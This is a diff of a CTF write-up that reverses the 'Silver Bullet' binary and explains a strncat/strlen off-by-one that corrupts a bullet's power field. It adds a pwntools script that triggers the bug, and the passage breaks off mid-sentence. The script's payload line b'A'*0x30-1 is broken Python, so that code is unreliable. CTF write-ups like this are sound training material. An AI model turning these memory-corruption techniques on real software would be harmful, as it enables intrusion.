@@ -19,7 +19,7 @@ Please kill the werewolf with silver bullet!
 
 # ACT_0x01: What Do?
 
-Alright! So to start off our challenge, let's just do the classic holy combo of `file`, `checksec`, and also just running the damn thing. Oh, and a little tool I came across called `cwe_checker`, PITA to install, but super cool when it works! Also, I can't run the damn thing, so I'll also be using `pwninit` to set up my exploit environment and auto patch the binary. Saves so much time.
+Alright! So to start off our challenge, let's just do the classic holy combo of `file`, `checksec`, and also just running the damn thing. Oh, and a little tool I came across called `cwe_checker`, it's a PITA to install, but super cool when it works! Also, I can't run the damn thing, so I'll also be using `pwninit` to set up my exploit environment and auto patch the binary. Saves so much time.
 
 ## file:
 ```
@@ -50,7 +50,7 @@ Quick recap on what full RELRO is, it just relocates the GOT section and also ma
 The important excerpts are as follows:
 > Firstly, PLT needs to be located at a fixed offset from the .text section. Secondly, since GOT contains data used by different parts of the program directly, it needs to be allocated at a known static address in memory. Lastly, and more importantly, because the GOT is lazily bound it needs to be writable. -SNIP-
 
-Basically Full RELRO makes overwriting this GOT impossible, although targeting the .fini array, free/malloc hook overwrites, ROP, and most other attacks are all still on the table :3.
+Basically Full RELRO makes overwriting this GOT impossible, free/malloc hook overwrites, ROP, and most other attacks are all still on the table :3.
 
 
 ## Running it:
@@ -196,15 +196,26 @@ Yes, I do use the Rust IL in Binja, why? Because it's nice. Actual reason is bec
 
 Aight, we got main here, the `init_proc` function is just classic [CTF buffering setup](https://www.reddit.com/r/ExploitDev/comments/in5mpl/setvbufsetbuf_calls/), so we don't care. The rest is just a classic menu challenge, nothing interesting yet.
 
-Only thing we see is that `var_40` variable that gets passed into `beat`. Currently the functions we care about in order are: `power_up`, `create_bullet`, `beat`
+Only thing we see is that `var_40` variable that gets passed into `beat`. Currently the functions we care about in order are: `create_bullet`, `power_up`, `beat`
+
+## Gimme Some Silver
+![Create Bullet](image-3.png)
+
+Pretty standard, only interesting part is that we're dereferencing a pointer to check if it's null. So we're probably dealing with some kind of struct, and something inside it is `0x30` bytes. Then we're initializing some integer field in that struct to the number of characters we pass as our input.
+
+The `read_input` function is about as standard as it comes too, it goes character by character, looks for a newline, and null terminates our string.
+
+*boring*- let's move on.
+
+![Bored](image-4.png)
 
 ## Power Up
 
-![Alt text](image.png)
+![PowerUp](image.png)
 
-Hmm, aight so from the top, the memorable parts I immediately see are:
+Hmm, aight so from the top, the parts I immediately see that look interesting are:
 
-- `arg1` is definitely a struct, of at least size `0x30`. Binja makes auto structs but for the Ghidra and (surprisingly) Ida users I'll set up what I think the struct is in a sec.
+- Yeaaah, `arg1` is definitely a struct, of at least size `0x30`. Binja makes auto structs but for the Ghidra and (surprisingly) Ida users I'll set up what I think the struct is in a sec.
 - We have to create the bullet first before powering up
 - After making a bullet with random user input we can use `power_up` to add another description, from there we use the `read_input` func into that `var_38` buffer based off the remaining power of our `arg1` struct.
 - ❗ Ayo, now we `strncat` into that `var_38` buffer where the size is based off our remaining power.
@@ -221,7 +232,7 @@ Last part is `arg1->offset(0x30)`, this part's checked to make sure that it's be
 
 ```c
 struct bullet {
-    char[30] bullet_buf;
+    char[0x30] bullet_buf;
     int power;
 }
 ```
@@ -260,7 +271,7 @@ How does this help us though? It's not like we're working with the heap, and it'
 
 Well, remember that random observation we made analyzing `power_up`?
 
-> As long as we don't crash the program, if we somehow get rid of the null byte at the end of our bullet buffer, we'll probably get a massive power, since `strlen` keeps going until it bumps into a terminating null byte.
+> As long as we don't crash the program, if we somehow get rid of the null byte at the end of our bullet buffer due to the fact that the power will write into the place where the null terminator is supposed to be, so we'll probably get a massive power, since `strlen` keeps going until it bumps into a currently non-existent null byte.
 
 Well it's time to put our money where our mouth is and try it out.
 
@@ -417,6 +428,71 @@ Aight, let's lay out the goals of our debug sesh:
 2. Maybe see what the correlation between inputs and the third power calculation (the one that gives us the thicc values).
 3. See if we have control over the return address.
 
-With that laid out, 
+With that laid out, let's beat this big bad wolf xd.
 
-WIP.
+## Hack and Slash
+
+Sweetness! So I personally use [pwninit](https://github.com/io12/pwninit) to set up my environment. Pretty much all we have to do is type `pwninit` inside the directory our challenge is in and if we're provided a libc file it'll just go and grab the relevant linker, give you libc symbols, create an exploit script for you, pay for your college, save your dog from a burning building, etc!
+
+![alt text](image-2.png)
+
+Okay, listen I never said it was perfect...
+
+Ooo look, shiny exploit script over there!
+
+### Exploit Script!
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+exe = ELF("./silver_bullet_patched")
+libc = ELF("./libc_32.so.6")
+ld = ELF("./ld-2.23.so")
+context.binary = exe
+
+ru = lambda *x, **y: p.recvuntil(*x, **y)
+rl = lambda *x, **y: p.recvline(*x, **y)
+rc = lambda *x, **y: p.recv(*x, **y)
+sla = lambda *x, **y: p.sendlineafter(*x, **y)
+sa = lambda *x, **y: p.sendafter(*x, **y)
+sl = lambda *x, **y: p.sendline(*x, **y)
+sn = lambda *x, **y: p.send(*x, **y)
+
+if args.REMOTE:
+    p = connect("addr", 1337)
+elif args.GDB:
+    # If there's stupid timers:
+    # handle SIGALRM ignore
+    gdb_script = """
+    b main
+    c
+    """
+    p = gdb.debug([exe.path], gdb_script)
+else:
+    p = process([exe.path])
+
+sla(b"Your choice :", b"1") # Create
+sla(b"Give me your description of bullet :",b"A"*0x30-1)
+sla(b"Your choice :", b"2") # Power up
+sla(b"Give me your description of bullet :", b"A")
+sla(b"Your choice :", b"3") # Beat 
+
+# Tick 197 Certified ;)
+p.interactive()
+```
+
+Essentially all we're doing is exactly what we found during reversing and playing with the binary:
+1. First we create a bullet with 47 characters
+2. Power that bullet up and add a single character.
+3. *Try* to beat the wolf.
+
+I explained the reason this is a vulnerability a bit above but a super quick overview is that we're creating a buffer of 47 characters in a struct that looks like:
+
+```c
+struct bullet {
+    char[48] bullet_buf;
+    int power;
+}
+```
+
+The `strlen` function only reads up to 
